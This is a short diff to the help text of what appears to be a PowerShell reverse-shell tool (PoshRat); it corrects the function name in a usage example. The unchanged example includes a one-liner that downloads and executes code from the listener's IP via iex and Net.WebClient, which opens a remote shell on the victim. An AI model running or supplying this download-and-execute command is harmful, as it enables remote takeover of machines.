@@ -23,7 +23,7 @@ The IP address on which the listener listens. Make sure that the IP address spec
 The port on which the connection is establised. 
 
 .EXAMPLE
-PS > Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 80
+PS > Invoke-PoshRatHttp -IPAddress 192.168.254.1 -Port 80
 
 Above shows an example where the listener starts on port 80. On the client execute:
 iex (New-Object Net.WebClient).DownloadString("http://192.168.254.1/connect")
